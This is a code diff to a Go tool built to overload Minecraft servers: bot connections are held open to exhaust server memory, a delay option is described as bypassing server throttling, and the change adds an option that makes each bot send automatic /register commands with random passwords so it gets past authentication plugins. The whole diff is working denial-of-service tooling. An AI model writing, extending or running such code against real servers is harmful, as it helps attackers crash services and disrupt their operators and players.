@@ -35,7 +35,10 @@ var (
 	// but Mojang join is skipped — the server will kick with "Failed to verify username!"
 	accessToken string
 	playerUUID  string
+	login       bool
+)
 
+var (
 	// joinGate is a shared rate-limiter channel; workers block here before each
 	// new TCP dial. nil means unlimited. Set via --join-delay.
 	joinGate chan struct{}
@@ -359,6 +362,25 @@ func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
 	dbgOK("Play state reached — holding indefinitely (Ctrl-C to stop)")
 	kaCount := 0
 
+	if login {
+		go func() {
+			time.Sleep(1000 * time.Millisecond)
+			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+			pass1 := randString(rng, 10)
+			pass2 := randString(rng, 10)
+
+			cmd1 := fmt.Sprintf("register %s", pass1)
+			pkt1 := buildChatCommand(cmd1, compressed)
+			conn.Write(pkt1)
+			dbgSend(0x04, fmt.Sprintf("/%s", cmd1), pkt1)
+
+			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
+			pkt2 := buildChatCommand(cmd2, compressed)
+			conn.Write(pkt2)
+			dbgSend(0x04, fmt.Sprintf("/%s", cmd2), pkt2)
+		}()
+	}
+
 	for {
 		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 		id, data, err := readPacket(conn, compressed)
@@ -462,6 +484,31 @@ func buildPacket(id int, payload []byte, compressed bool) []byte {
 		out = writeVarInt(out, len(data))
 		return append(out, data...)
 	}
+}
+
+func buildChatCommand(cmd string, compressed bool) []byte {
+	var payload []byte
+	payload = writeString(payload, cmd)
+
+	// Timestamp (Long)
+	t := time.Now().UnixMilli()
+	tBuf := make([]byte, 8)
+	binary.BigEndian.PutUint64(tBuf, uint64(t))
+	payload = append(payload, tBuf...)
+
+	// Salt (Long)
+	payload = append(payload, make([]byte, 8)...)
+
+	// Argument Count (VarInt) = 0
+	payload = writeVarInt(payload, 0)
+
+	// Message Count (VarInt) = 0
+	payload = writeVarInt(payload, 0)
+
+	// Acknowledged Messages (BitSet) = empty (0 VarInt count)
+	payload = writeVarInt(payload, 0)
+
+	return buildPacket(0x04, payload, compressed)
 }
 
 func buildHandshake(host string, port uint16) []byte {
@@ -840,9 +887,27 @@ func drainConfig(conn net.Conn, compressed bool, verbose bool) bool {
 	}
 }
 
-func holdConnPlay(conn net.Conn, compressed bool, verbose bool) {
+func holdConnPlay(conn net.Conn, compressed bool, verbose bool, rng *rand.Rand) {
 	defer conn.Close()
 	defer activeConns.Add(-1)
+
+	if login {
+		go func() {
+			time.Sleep(1000 * time.Millisecond)
+			pass1 := randString(rng, 10)
+			pass2 := randString(rng, 10)
+
+			cmd1 := fmt.Sprintf("register %s", pass1)
+			pkt1 := buildChatCommand(cmd1, compressed)
+			conn.Write(pkt1)
+			bytesSent.Add(int64(len(pkt1)))
+
+			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
+			pkt2 := buildChatCommand(cmd2, compressed)
+			conn.Write(pkt2)
+			bytesSent.Add(int64(len(pkt2)))
+		}()
+	}
 
 	for {
 		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
@@ -956,7 +1021,7 @@ func worker(target string, port uint16, bloatSize int, dribbleInterval time.Dura
 
 		activeConn, inPlay, compressed := tryAdvanceToPlay(conn, verbose)
 		if inPlay {
-			holdConnPlay(activeConn, compressed, verbose)
+			holdConnPlay(activeConn, compressed, verbose, rng)
 		} else {
 			holdConn(activeConn, dribbleInterval, verbose)
 		}
@@ -1025,6 +1090,7 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 		joinDelay, _ := cmd.Flags().GetDuration("join-delay")
 		accessToken, _ = cmd.Flags().GetString("access-token")
 		playerUUID, _ = cmd.Flags().GetString("player-uuid")
+		login, _ = cmd.Flags().GetBool("login")
 
 		if bloatSize > 255 {
 			return fmt.Errorf("--bloat-size max is 255 (Minecraft protocol limit)")
@@ -1062,6 +1128,7 @@ func init() {
 	f.DurationP("join-delay", "j", 0, "minimum gap between new connections (e.g. 4001ms to bypass server throttle)")
 	f.StringP("access-token", "a", "", "Mojang access token (online-mode auth)")
 	f.StringP("player-uuid", "u", "", "Mojang player UUID matching the access token")
+	f.BoolP("login", "l", false, "automatically send /register commands after join")
 }
 
 func main() {
